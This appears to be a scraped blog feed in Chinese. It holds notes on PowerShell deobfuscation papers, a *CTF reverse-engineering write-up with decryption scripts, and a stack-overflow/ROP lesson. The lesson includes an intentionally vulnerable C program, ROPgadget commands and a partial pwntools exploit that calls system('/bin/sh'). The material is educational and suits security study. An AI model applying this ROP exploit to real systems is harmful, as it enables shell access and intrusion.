https://github.com/danielbohannon/Revoke-Obfuscation.[35] S. Aebersold, K. Kryszczuk, S. Paganoni, B. Tellenbach, and T. Trowbridge, “Detecting obfuscated javascripts using machine learning,” in ICIMP, 2016.[36] M. Jodavi, M. Abadi, and E. Parhizkar, “Jsobfusdetector: A binary pso-based one-class classifier ensemble to detect obfuscated javascript code,”in IEEE AISP, 2015. 但是混淆的样本和恶意的样本之间并没有直接的联系，所以，已经存在的检测方法去正确的检测混淆的恶意的PowerShell样本是非常困难的。 混淆技术二进制混淆攻击者经常使用实时的加壳技术来混淆恶意代码并阻止静态分析。 ‍ 脚本混淆各种混淆技术可以帮助恶意脚本逃避防病毒软件的检测[40]，[41]。Wang等人[42]提出了一种基于控制流转换的JavaScript代码混淆技术。有许多流行的混淆工具，例如Invoke Obfusion[12]、PowerSploit[43]、Empire[44]等，它们提供了丰富的混淆技术，如第II-B节所述。 [40] W. Xu, F. Zhang, and S. Zhu, “The power of obfuscation techniques in malicious javascript code: A measurement study,” in IEEE MALWARE,2012.[41] A. Balakrishnan and C. Schulze, “Code obfuscation literature survey,”CS701 Construction of compilers, 2005.[42] Z. Y . Wang and W. M. Wu, “Technique of javascript code obfuscation based on control flow tansformations,” in AMM, 2014.[43] “Powersploit - a powershell post-exploitation framework,” https://github.com/PowerShellMafia/PowerSploit.[44] “Empire - a powershell and python post-exploitation agent,” https://github.com/EmpireProject/Empire. [12] D. Bohannon, “Invoke-obfuscation - powershell obfuscator,” https://github.com/danielbohannon/Invoke-Obfuscation. ‍ 去混淆技术‍ 常见的去混淆技术分为2种，动态分析和静态分析，动态分析通常在隔离环境中执行样本，并检测其行为[45]-[47]。它只能从脚本的行为推断脚本的意图，并且代码覆盖率很低 [45] G. Lu, K. Coogan, and S. Debray, “Automatic simplification of obfus-cated javascript code,” in IEEE ICISTM, 2012.[46] B. Feinstein, D. Peck, and I. SecureWorks, “Caffeine monkey: Auto-mated collection, detection and analysis of malicious javascript,” BlackHat USA, 2007.[47] U. Bayer, A. Moser, C. Kruegel, and E. Kirda, “Dynamic analysis ofmalicious code,” Journal in Computer Virology, 2006 静态分析需要识别混淆的数据和相应的恢复算法，这通常非常困难。 基于正则表达的工具，比如PSDecode [16], PowerDrive[17], PowerDecode [18]，他忽略了脚本片段的语法以至于他们不能精确的识别混淆片段。 Li等人[19] 利用基于机器学习的分类器和AST特征来识别混淆的脚本片段，然而，由于缺乏上下文环境和错误的替换，他们的工具方法经常遭遇语法错误和语义不一致， Invoke Deobfusion利用AST上的可恢复节点来识别混淆的片段，并实现变量跟踪以减轻上述挑战 ‍ 总结在本文中，我们提出了Invoke Deobfusion，这是第一个基于AST的、具有变量跟踪功能的保留语义的PowerShell脚本Deobfuscation工具。 Invoke-Deobfuscation使用AST的令牌和可恢复的节点来精确的识别模糊脚本片段，跟踪变量的值和范围，并模拟脚本片段的执行，以获得正确的恢复结果。 为了保持脚本的原始语义，Invoke Deobfusion严格处理替换。 我们的评估表明，Invoke Deobfusion在处理各种混淆技术、消除混淆有效性、保持脚本语义以及减轻野生样本混淆方面优于最先进的工具。 InvokeDeobfusion恢复的关键信息量是其他工具的两倍多，并且InvokeDeoBfusion的100%的Deobfuscation结果具有与原始样本相同的行为。 此外，Invoke-Deobfuscation能够减少野生样本混淆分数46% ‍ ‍","categories":[{"name":"论文阅读","slug":"论文阅读","permalink":"https://zzzzsky.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}],"tags":[{"name":"powershell","slug":"powershell","permalink":"https://zzzzsky.github.io/tags/powershell/"}]},{"title":"《Effective and Light-Weight Deobfuscation and Semantic-Aware Attack Detection for PowerShell Scripts》论文阅读","slug":"paper1_Effective","date":"2022-10-20T14:00:00.000Z","updated":"2023-02-20T08:29:08.932Z","comments":true,"path":"2022/10/20/paper1_Effective/","link":"","permalink":"https://zzzzsky.github.io/2022/10/20/paper1_Effective/","excerpt":"","text":"1. Effective and Light-Weight Deobfuscation and Semantic-Aware Attack Detection for PowerShell Scripts代码在 https://github.com/li-zhenyuan/Effective-and-Light-Weight-Deobfuscation-and-Semantic-Aware-Attack-Detection-for-PowerShell-Scripts 主要工作 先基于子树去混淆（利用了机器学习识别混淆的子树） 利用OOA提取了恶意代码的语义规则然后进行检测 ‍ POWERSHELL DEOBFUSCATION ‍ 处理混淆大体分为5个阶段 把脚本文件解析为AST树（在解析的时候，对变量两端进行链接，在下面的第2步，第3步也这样操作） 用分类器识别混淆的子树（用到了机器学习， 混淆的子树并不都是可恢复的） 利用仿真器恢复混淆的片段 把第三步解混淆后的片段再弄成AST子树，替换进去 （1-4步循环，直到找不到混淆的子树）利用Post Processing模块把找不到混淆的那个最终的AST树再变成脚本文件 ‍ 1. Extract Suspicious Subtrees因为在AST数中，只有2种方法传递恢复的片段给上层节点 管道（pipe） 变量 所以只检测2种类型的子树 PipelineAst 和 AssignmentStatementAst,称这2种子树为Suspicious Subtrees， 以广度优先的方式遍历AST， 并将可疑子树推送到堆栈中以进行后续步骤 ‍ 2. Subtree-based Obfuscation Detection基于机器学习的子树混淆检测。。 提出4种类型的特征 Entropy of script pieces Lengths of tokens Distribution of AST types Depth of AST 3. Emulation-based Recovery直接启动一个powershell进程，然后去执行，返回值就是易经恢复好的字符串 比如​ (&quot;&#123;0&#125;&#123;1&#125;&quot; -f&#39;ie&#39;,&#39;x&#39;) –&gt; iex 如果返回值不是字符串，说明上一步检测的这个子树有问题，即给这个子树标记为非混淆子树，然后继续跳过去分析下一个obfuscation-subtree 4. AST Update当得到一个恢复的脚本片段的时候，将其变为AST（Recovered subtree）而且更新AST 这个过程主要有2步： 将已经恢复的AST子树去替换掉刚才的可恢复的AST子树，并且修改这个子树的祖先的特征，以及把这个子树的所有的可疑子树推到堆栈中。 更新脚本片段，在子树的根节点位置存储具体的脚本片段，这个脚本片段应该被更新 5. Post processing‍ 根据字符串之间的符号来进行后处理，比如 &quot;(&quot;DownloadFile&quot;).Invoke($url)&quot; 因为有个.Invoke ，中间的.就说明$url是个参数，然后DowloadFile是个函数 ‍ ‍ SEMANTIC-AWARE POWERSHELL ATTACK DETECTION‍ 检测系统主要是处理API集合，然后主要分为2个阶段， 训练阶段和检测阶段 Training Phase先根据前面提到的AST子树去针对 InvokeMemberExpressionAst、CommandAst等 提取一些itemsets，比如 &#123;’new-object’, ’downloadfile’, ’start-process’&#125;就是一个itemset 然后用一个 classic classification based on OOA mining 去对分析出来的itemsets进行操作 首先用FP-Growth算法来生成frequent patterns，比如{z, r}, {z,x,y,t}这种 选择满足条件​的patterns来作为OOA rules 满足什么条件呢？这里用到了2个数据，一个支持度，一个置信度 至于支持度、置信度是什么？可以看下面2个文章 https://blog.csdn.net/wo334499/article/details/51698810 https://blog.csdn.net/cnweike/article/details/7311468 ‍ $support(I, Obj) = \\frac { count(I\\cup{ Obj}, DB) } {|DB|}$​ $confidence(I, Obj)= \\frac { count(I\\cup{ Obj}, DB) } {count(I, DB)}$​ ‍ 根据图8，{z, r}的支持度为 2(即是{z,r}， 又是恶意的) / 5 = 0.4 {z, r}的置信度为 2 / 2 = 1 {z,x,y,t}的支持度是 1 / 5 = 0.2 （不知道为啥论文这里是0.6，我怀疑是不是写错了？？？？）​ {z,x,y,t}的置信度是 1 / 3 = 0.33 ‍ 如果是支持度 &gt; 0.2 且 置信度 &gt;0.9,,则把它放到OOA规则中 ‍ 最终提取了31个OOA规则，典型的一些列在下图 Detection Phase将脚本解析为itemsets，然后去匹配上一步训练好的OOA规则 ‍ ‍ 后面的评估部分之后再看​ ‍","categories":[{"name":"论文阅读","slug":"论文阅读","permalink":"https://zzzzsky.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}],"tags":[{"name":"powershell","slug":"powershell","permalink":"https://zzzzsky.github.io/tags/powershell/"}]},{"title":"2022* CTF部分RE题目WP","slug":"statCTF_部分RE_WP","date":"2022-04-17T14:00:00.000Z","updated":"2022-04-18T05:49:54.597Z","comments":true,"path":"2022/04/17/statCTF_部分RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/","excerpt":"","text":"2022* CTF部分RE题目WPSimple File SystemIDA打开程序进行分析 instruction.txt的内容为 123456789101112# instructionsI implemented a very simple file system and buried my flag in it.The image file are initiated as follows: ./simplefs image.flag 500 simplefs&gt; format simplefs&gt; mount simplefs&gt; plantflag simplefs&gt; exitAnd you cold run &quot;help&quot; to explore other commands. 程序逻辑是创建一个磁盘，格式化并挂载，然后将flag文件的内容加密后存储进去，只需要找到对应的加密函数写解密脚本即可 IDA找到plantflag处的代码 这里的sub_216A函数的功能其实就是create_inode,v21，v22是2个随机数，而sub_1e16的第二个参数是不同的，进去分析 发现sub_21B2才是真正的加密函数，在此函数下断点，把程序运行参数设置为imagetest.flag 500，IDA远程动态调试，运行并执行命令 123simplefs&gt; formatsimplefs&gt; mountsimplefs&gt; plantflag 调试发现V4的值一定是0xDEEDBEEF，观察imagetest.flag文件，发现从偏移0X33000开始存储，每隔0x1000存1个enc_flag，不过这些enc_flag只有1个是真正的通过sub_21b2函数进行加密的，其他的都是sub_2305中生成的随机数，所以不管它，直接把所有enc_flag执行一下解密函数就可以了。 exp为 12345678910111213141516171819202122232425def ROR(_num, _n): return (((_num &gt;&gt; _n) &amp; 0XFF) | ((_num &lt;&lt; (8 - _n)) &amp; 0XFF)) &amp; 0XFFdef dec(a): for i in range(len(a)): a[i] = ROR(a[i], 3) a[i] ^= 0xDE a[i] = ROR(a[i], 4) a[i] ^= 0xED a[i] = ROR(a[i], 5) a[i] ^= 0xBE a[i] = ROR(a[i], 6) a[i] ^= 0xEF a[i] = ROR(a[i], 7) return awith open(&#x27;./image.flag&#x27;, &#x27;rb&#x27;) as f: data = f.read()data_splitted = [list(data[0x33000 + i * 0x1000: 0x33000 + i * 0x1000 + 32]) for i in range(200)]for data in data_splitted: dec_data = bytes(dec(data)) if b&#x27;*CTF&#x27; in dec_data: print(dec_data) breakb&#x27;*CTF&#123;Gwed9VQpM4Lanf0kEj1oFJR6&#125;\\n*&#x27; NaClIDA打开分析，测试是最终这2段数据进行对比，如果相同的话，flag就是*CTF{input} 调试起来，发现了xtea算法 最终经过无尽的调试，还原了题目算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#define LeftRotate(word, bits) ( (word) &lt;&lt; (bits) | (word) &gt;&gt; (32 - (bits)) )unsigned int dword_80AFB60[44] = &#123; 0x04050607, 0x00010203, 0x0C0D0E0F, 0x08090A0B, 0xCD3FE81B, 0xD7C45477, 0x9F3E9236, 0x0107F187, 0xF993CB81, 0xBF74166C, 0xDA198427, 0x1A05ABFF, 0x9307E5E4, 0xCB8B0E45, 0x306DF7F5, 0xAD300197, 0xAA86B056, 0x449263BA, 0x3FA4401B, 0x1E41F917, 0xC6CB1E7D, 0x18EB0D7A, 0xD4EC4800, 0xB486F92B, 0x8737F9F3, 0x765E3D25, 0xDB3D3537, 0xEE44552B, 0x11D0C94C, 0x9B605BCB, 0x903B98B3, 0x24C2EEA3, 0x896E10A2, 0x2247F0C0, 0xB84E5CAA, 0x8D2C04F0, 0x3BC7842C, 0x1A50D606, 0x49A1917C, 0x7E1CB50C, 0xFC27B826, 0x5FDDDFBC, 0xDE0FC404, 0xB2B30907&#125;;DWORD xtea_key[4] = &#123; 0x03020100, 0x07060504, 0x0B0A0908, 0x0F0E0D0C &#125;;//xtea算法void encipher(unsigned int num_rounds, DWORD v[2], DWORD key[4]) &#123; unsigned int i; DWORD v0 = v[0], v1 = v[1], sum = 0, delta = 0x10325476; for (i = 0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;void enc11(DWORD* v)&#123; for (int i = 0; i &lt;= 43; i++) &#123; DWORD tmp = v[0]; v[0] = (LeftRotate(v[0], 1) &amp; LeftRotate(v[0], 8)) ^ LeftRotate(v[0], 2) ^ v[1] ^ dword_80AFB60[i]; v[1] = tmp; &#125; DWORD tmp = v[0]; v[0] = v[1]; v[1] = tmp;&#125;int main()&#123; // input = &quot;12345678901234561234567890123456&quot; DWORD v[] = &#123; 0X31323334 ,0X35363738, 0x39303132, 0x33343536, 0X31323334 ,0X35363738, 0x39303132, 0x33343536&#125;; DWORD rounds[] = &#123; 2, 4, 8, 16 &#125;; for (int i = 0; i &lt; 8; i += 2) &#123; enc11(&amp;v[i]); encipher(rounds[i/2], &amp;v[i], xtea_key); &#125; return 0;&#125; 接下来的任务就简单了，比着写解密脚本即可 exp为: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#define LeftRotate(word, bits) ( (word) &lt;&lt; (bits) | (word) &gt;&gt; (32 - (bits)) )unsigned int dword_80AFB60[44] = &#123; 0x04050607, 0x00010203, 0x0C0D0E0F, 0x08090A0B, 0xCD3FE81B, 0xD7C45477, 0x9F3E9236, 0x0107F187, 0xF993CB81, 0xBF74166C, 0xDA198427, 0x1A05ABFF, 0x9307E5E4, 0xCB8B0E45, 0x306DF7F5, 0xAD300197, 0xAA86B056, 0x449263BA, 0x3FA4401B, 0x1E41F917, 0xC6CB1E7D, 0x18EB0D7A, 0xD4EC4800, 0xB486F92B, 0x8737F9F3, 0x765E3D25, 0xDB3D3537, 0xEE44552B, 0x11D0C94C, 0x9B605BCB, 0x903B98B3, 0x24C2EEA3, 0x896E10A2, 0x2247F0C0, 0xB84E5CAA, 0x8D2C04F0, 0x3BC7842C, 0x1A50D606, 0x49A1917C, 0x7E1CB50C, 0xFC27B826, 0x5FDDDFBC, 0xDE0FC404, 0xB2B30907&#125;;DWORD xtea_key[4] = &#123; 0x03020100, 0x07060504, 0x0B0A0908, 0x0F0E0D0C &#125;;void decipher(unsigned int num_rounds, DWORD v[2], DWORD key[4]) &#123; unsigned int i; DWORD v0 = v[0], v1 = v[1], delta = 0x10325476, sum = delta * num_rounds; for (i = 0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;void enc11(DWORD* v)&#123; for (int i = 0; i &lt;= 43; i++) &#123; DWORD tmp = v[0]; v[0] = (LeftRotate(v[0], 1) &amp; LeftRotate(v[0], 8)) ^ LeftRotate(v[0], 2) ^ v[1] ^ dword_80AFB60[i]; v[1] = tmp; &#125; DWORD tmp = v[0]; v[0] = v[1]; v[1] = tmp;&#125;void dec11(DWORD* v)&#123; DWORD tmp = v[0]; v[0] = v[1]; v[1] = tmp; //************************ for (int i = 0; i &lt;= 43; i++) &#123; tmp = v[0]; v[0] = v[1]; v[1] = (LeftRotate(v[0], 1) &amp; LeftRotate(v[0], 8)) ^ LeftRotate(v[0], 2) ^ tmp ^ dword_80AFB60[43-i]; &#125;&#125;int main()&#123; DWORD enc[] = &#123; 0xFDF5C266, 0x7A328286, 0xCE944004, 0x5DE08ADC, 0xA6E4BD0A, 0x16CAADDC, 0x13CD6F0C, 0x1A75D936 &#125;; //input = &quot;1234567890abcdefghijklmn12366666&quot; //DWORD enc[] = &#123; 0x4A16D2F5, 0x3995DF74, 0xC0B2BC9A, 0x313495AC, 0x207EAA57, 0x5C46F1CB, 0x9AB2B6D3, 0xF0E536C3 &#125;; DWORD rounds[] = &#123; 2, 4, 8, 16 &#125;; for (int i = 0; i &lt; 8; i += 2) &#123; decipher(rounds[i / 2], &amp;enc[i], xtea_key); dec11(&amp;enc[i]); &#125; char* flag = (char*)enc; for (int i = 0; i &lt; 32; i += 4) &#123; printf(&quot;%c&quot;, flag[i+3]); printf(&quot;%c&quot;, flag[i + 2]); printf(&quot;%c&quot;, flag[i + 1]); printf(&quot;%c&quot;, flag[i]); &#125; return 0;&#125;// mM7pJIobsCTQPO6R0g-L8kFExhYuivBN JumpIDA打开，发现符号都被去除了，用Finger恢复一下符号 https://github.com/aliyunav/Finger ，我只能说这个工具太牛逼了 Finger分析前 Finger分析后 爽歪歪~~~ 开始分析 程序起名叫Jump，而在调试的过程中，发现确实是Jump，程序从一个地方调到了另一个地方，于是谷歌搜索，找到一篇文章 https://blog.csdn.net/dog250/article/details/89742140 感觉跟题目好像，就是保存线程上下文，然后恢复这个线程上下文来实现跳转 经过分析，找到了save_ctx和restore_ctx函数 后面的第一个参数其实就是context, 逆向了下这个save_ctx,发现context结构大致如下 123456789101112131400000000 ctx struc ; (sizeof=0x60, mappedto_18)00000000 _rbx dq ?00000008 _enc_rbp dq ?00000010 _r12 dq ?00000018 _r13 dq ?00000020 _r14 dq ?00000028 _r15 dq ?00000030 _enc_rsp_8 dq ? ; [rsp+8] enc00000038 _enc_rsp_0 dq ? ; [rsp] --&gt; rip00000040 _rsi dq ? ; 当rsi为0的时候，这个位置存rsi寄存器的值00000048 field_48 dq ?00000050 field_50 dq ?00000058 _rax dq ?00000060 ctx ends 调试找到最终比较的位置 密文是[0x03, 0x6A, 0x6D, 0x47, 0x6E, 0x5F, 0x3D, 0x75, 0x61, 0x53, 0x5A, 0x4C, 0x76, 0x4E, 0x34, 0x77, 0x46, 0x78, 0x45, 0x36, 0x52, 0x2B, 0x70, 0x02, 0x44, 0x32, 0x71, 0x56, 0x31, 0x43, 0x42, 0x54, 0x63, 0x6B] sub_401F62 是关键加密函数，他把这个矩阵每一行，按第一个字符大小进行排序，然后排完序的这个矩阵的最后一列就是密文，现在知道这个矩阵的第一列和最后一列，来求flag 举个例子，假如我们输入的是985236147adgjlqwesxzcvbnmfuiopvx, 程序先将其前加上\\x02尾部加上\\x03 然后一层层循环左移1个字符，循环33次，将循环后的二维数组保存在0000004C9408处，通过下面的IDApython打印出来 123456addr =[0x00000000004CC0D0, 0x00000000004CC100, 0x00000000004CC130, 0x00000000004CC160, 0x00000000004CC190, 0x00000000004CC1C0, 0x00000000004CC1F0, 0x00000000004CC220, 0x00000000004CC250, 0x00000000004CC280, 0x00000000004CC2B0, 0x00000000004CC2E0, 0x00000000004CC310, 0x00000000004CC340, 0x00000000004CC370, 0x00000000004CC3A0, 0x00000000004CC3D0, 0x00000000004CC400, 0x00000000004CC430, 0x00000000004CC460, 0x00000000004CC490, 0x00000000004CC4C0, 0x00000000004CC4F0, 0x00000000004CC520, 0x00000000004CC550, 0x00000000004CC580, 0x00000000004CC5B0, 0x00000000004CC5E0, 0x00000000004CC610, 0x00000000004CC640, 0x00000000004CC670, 0x00000000004CC6A0, 0x00000000004CC6D0, 0x00000000004CC700] # 0000004C9408处存的34个指针for i in range(34): tmp = b&quot;&quot; for j in range(34): tmp += get_bytes(addr[i]+j, 1) print(tmp) 12345678910111213141516171819202122232425262728293031323334b&#x27;\\x02985236147adgjlqwesxzcvbnmfuiopvx\\x03&#x27;b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\\x03\\x02&#x27;b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\\x03\\x029&#x27;b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\\x03\\x0298&#x27;b&#x27;236147adgjlqwesxzcvbnmfuiopvx\\x03\\x02985&#x27;b&#x27;36147adgjlqwesxzcvbnmfuiopvx\\x03\\x029852&#x27;b&#x27;6147adgjlqwesxzcvbnmfuiopvx\\x03\\x0298523&#x27;b&#x27;147adgjlqwesxzcvbnmfuiopvx\\x03\\x02985236&#x27;b&#x27;47adgjlqwesxzcvbnmfuiopvx\\x03\\x029852361&#x27;b&#x27;7adgjlqwesxzcvbnmfuiopvx\\x03\\x0298523614&#x27;b&#x27;adgjlqwesxzcvbnmfuiopvx\\x03\\x02985236147&#x27;b&#x27;dgjlqwesxzcvbnmfuiopvx\\x03\\x02985236147a&#x27;b&#x27;gjlqwesxzcvbnmfuiopvx\\x03\\x02985236147ad&#x27;b&#x27;jlqwesxzcvbnmfuiopvx\\x03\\x02985236147adg&#x27;b&#x27;lqwesxzcvbnmfuiopvx\\x03\\x02985236147adgj&#x27;b&#x27;qwesxzcvbnmfuiopvx\\x03\\x02985236147adgjl&#x27;b&#x27;wesxzcvbnmfuiopvx\\x03\\x02985236147adgjlq&#x27;b&#x27;esxzcvbnmfuiopvx\\x03\\x02985236147adgjlqw&#x27;b&#x27;sxzcvbnmfuiopvx\\x03\\x02985236147adgjlqwe&#x27;b&#x27;xzcvbnmfuiopvx\\x03\\x02985236147adgjlqwes&#x27;b&#x27;zcvbnmfuiopvx\\x03\\x02985236147adgjlqwesx&#x27;b&#x27;cvbnmfuiopvx\\x03\\x02985236147adgjlqwesxz&#x27;b&#x27;vbnmfuiopvx\\x03\\x02985236147adgjlqwesxzc&#x27;b&#x27;bnmfuiopvx\\x03\\x02985236147adgjlqwesxzcv&#x27;b&#x27;nmfuiopvx\\x03\\x02985236147adgjlqwesxzcvb&#x27;b&#x27;mfuiopvx\\x03\\x02985236147adgjlqwesxzcvbn&#x27;b&#x27;fuiopvx\\x03\\x02985236147adgjlqwesxzcvbnm&#x27;b&#x27;uiopvx\\x03\\x02985236147adgjlqwesxzcvbnmf&#x27;b&#x27;iopvx\\x03\\x02985236147adgjlqwesxzcvbnmfu&#x27;b&#x27;opvx\\x03\\x02985236147adgjlqwesxzcvbnmfui&#x27;b&#x27;pvx\\x03\\x02985236147adgjlqwesxzcvbnmfuio&#x27;b&#x27;vx\\x03\\x02985236147adgjlqwesxzcvbnmfuiop&#x27;b&#x27;x\\x03\\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;b&#x27;\\x03\\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27; 然后经过sub_401F62函数，再重新查看0000004C9408处的指针，发现顺序与之前不一样，重新整理IDApython脚本，再打印下 12345678910111213141516171819202122232425262728293031323334b&#x27;\\x02985236147adgjlqwesxzcvbnmfuiopvx\\x03&#x27;b&#x27;\\x03\\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;b&#x27;147adgjlqwesxzcvbnmfuiopvx\\x03\\x02985236&#x27;b&#x27;236147adgjlqwesxzcvbnmfuiopvx\\x03\\x02985&#x27;b&#x27;36147adgjlqwesxzcvbnmfuiopvx\\x03\\x029852&#x27;b&#x27;47adgjlqwesxzcvbnmfuiopvx\\x03\\x029852361&#x27;b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\\x03\\x0298&#x27;b&#x27;6147adgjlqwesxzcvbnmfuiopvx\\x03\\x0298523&#x27;b&#x27;7adgjlqwesxzcvbnmfuiopvx\\x03\\x0298523614&#x27;b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\\x03\\x029&#x27;b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\\x03\\x02&#x27;b&#x27;adgjlqwesxzcvbnmfuiopvx\\x03\\x02985236147&#x27;b&#x27;bnmfuiopvx\\x03\\x02985236147adgjlqwesxzcv&#x27;b&#x27;cvbnmfuiopvx\\x03\\x02985236147adgjlqwesxz&#x27;b&#x27;dgjlqwesxzcvbnmfuiopvx\\x03\\x02985236147a&#x27;b&#x27;esxzcvbnmfuiopvx\\x03\\x02985236147adgjlqw&#x27;b&#x27;fuiopvx\\x03\\x02985236147adgjlqwesxzcvbnm&#x27;b&#x27;gjlqwesxzcvbnmfuiopvx\\x03\\x02985236147ad&#x27;b&#x27;iopvx\\x03\\x02985236147adgjlqwesxzcvbnmfu&#x27;b&#x27;jlqwesxzcvbnmfuiopvx\\x03\\x02985236147adg&#x27;b&#x27;lqwesxzcvbnmfuiopvx\\x03\\x02985236147adgj&#x27;b&#x27;mfuiopvx\\x03\\x02985236147adgjlqwesxzcvbn&#x27;b&#x27;nmfuiopvx\\x03\\x02985236147adgjlqwesxzcvb&#x27;b&#x27;opvx\\x03\\x02985236147adgjlqwesxzcvbnmfui&#x27;b&#x27;pvx\\x03\\x02985236147adgjlqwesxzcvbnmfuio&#x27;b&#x27;qwesxzcvbnmfuiopvx\\x03\\x02985236147adgjl&#x27;b&#x27;sxzcvbnmfuiopvx\\x03\\x02985236147adgjlqwe&#x27;b&#x27;uiopvx\\x03\\x02985236147adgjlqwesxzcvbnmf&#x27;b&#x27;vbnmfuiopvx\\x03\\x02985236147adgjlqwesxzc&#x27;b&#x27;vx\\x03\\x02985236147adgjlqwesxzcvbnmfuiop&#x27;b&#x27;wesxzcvbnmfuiopvx\\x03\\x02985236147adgjlq&#x27;b&#x27;x\\x03\\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;b&#x27;xzcvbnmfuiopvx\\x03\\x02985236147adgjlqwes&#x27;b&#x27;zcvbnmfuiopvx\\x03\\x02985236147adgjlqwesx&#x27; 每一行是按照第一个字符从小到大排序，而拍完序的最后一列，正好是000004C9420 存储的加密后的flag 现在已知密文是\\x03jmGn_=uaSZLvN4wFxE6R+p\\x02D2qV1CBTck,将其排序后为\\x02\\x03+1246=BCDEFGLNRSTVZ_acjkmnpquvwx 知道这个二位数组的第一列的每个字符和最后一列的每个字符，因为每一行的第一个字符和最后一个字符在原始字符串中肯定是挨着了，这样就可以慢慢推出原始字符串来了，写脚本解一下即可 123456789101112131415lie1 = list(b&#x27;\\x02\\x03+1246=BCDEFGLNRSTVZ_acjkmnpquvwx&#x27;)lie34 = list(b&#x27;\\x03jmGn_=uaSZLvN4wFxE6R+p\\x02D2qV1CBTck&#x27;)flag = [2] + [0] * 33map_ = [[lie1[i], lie34[i]] for i in range(34)]# print(map_)for i in range(33): tmp = lie34.index(flag[i]) flag[i+1] = lie1[tmp]print(flag)print(bytes(flag))# \\x02cwNG1paBu=6Vn2kxSCqm+_4LETvFRZDj\\x03","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"set_jmp","slug":"set-jmp","permalink":"https://zzzzsky.github.io/tags/set-jmp/"}]},{"title":"第10章_栈溢出与ROP","slug":"第10章_栈溢出与ROP","date":"2022-04-11T03:12:00.000Z","updated":"2022-04-11T03:24:19.234Z","comments":true,"path":"2022/04/11/第10章_栈溢出与ROP/","link":"","permalink":"https://zzzzsky.github.io/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/","excerpt":"","text":"栈溢出原理由于C语言对数组引用不做任何边界检查，从而导致缓冲区溢出成为一种很常见的漏洞。由于栈上保存着局部变量和一些状态信息（寄存器值、返回地址等），一旦发生严重的溢出，攻击者可以通过覆盖返回地址来执行任意代码，利用方法包括shellcode注入、retlibc，rop等 危险函数大多数缓冲区溢出问题都是错误地使用了一些危险函数所导致的。 scanf, gets这类 strcpy, strcat, sprintf这一类 返回导向编程ROP是Return-Oriented Programming 的缩写，因为引入了NX机制，数据所在的内存页被标记为不可执行，此时在执行shellcode就会抛出异常，因为注入新代码不可行，所以就利用程序中已有的代码。 使用ROP攻击，首先需要扫描文件，提取出可用的gadget片段（通常以ret指令结尾），然后将这些gadget进行组合，来达到攻击者的目的。举个例子，exit(0)的shellcode由下面4条连续的指令组成。 12345; exit(0) shellcodexor eax, eaxxor ebx, ebxinc eaxint 0x80 ROP链为 12345678; exit(0) ROP chainxor eax, eax ;gadget 1 地址Aretxor ebx, ebx ;gadget 2 地址Bretinc eax ;gadget 3 地址Cretint 0x80 ;gadget 4 地址D 栈为（上面为低，下面为高） 1234地址A ;原来的EIP的位置 低地址地址B地址C地址D ; 高地址 示例程序源代码 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;void vuln_func()&#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main()&#123; void * handle = dlopen(&quot;libc.so.6&quot;, RTLD_NOW | RTLD_GLOBAL); printf(&quot;%p\\n&quot;, dlsym(handle, &quot;system&quot;)); vuln_func(); write(STDOUT_FILENO, &quot;Hello world!\\n&quot;, 13); return 0;&#125; 1gcc -fno-stack-protector -z noexecstack -pie -fpie main.c -ldl -o rop64 为了方便测试，这个地方直接打印出了system的地址，来模拟信息泄露。思路就是根据system的地址找到Libc的基地址，然后找到/bin/sh的地址 + gadget（pop rdi; ret） ，将rdi传入/bin/sh的地址，然后去调用system来获取shell 12345678910╭─ ~/Desktop/testC/stack_test ╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep rdi0x0000000000022394 : pop rdi ; pop rbp ; ret0x000000000002164f : pop rdi ; ret╭─ ~/Desktop/testC/stack_test ╰─ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot; Strings information============================================================0x00000000001b3d88 : /bin/sh exp1: ROP攻击 12345678910111213141516171819202122from pwn import *context.log_level = &quot;debug&quot;libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io = process(&quot;rop64&quot;)system_addr = int(io.recvuntil(b&quot;\\n&quot;)[:-1], 16)log.info(&quot;system_addr: %s&quot; % hex(system_addr))libc_base = system_addr - libc.symbols[&#x27;system&#x27;]log.info(&quot;libc_base: %s&quot; % hex(libc_base))binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))log.info(&quot;binsh_addr: %s&quot; % hex(binsh_addr))pop_rdi_addr = libc_base + 0x2164fret_addr = libc_base + 0x08aapayload = b&#x27;A&#x27; * 136 + 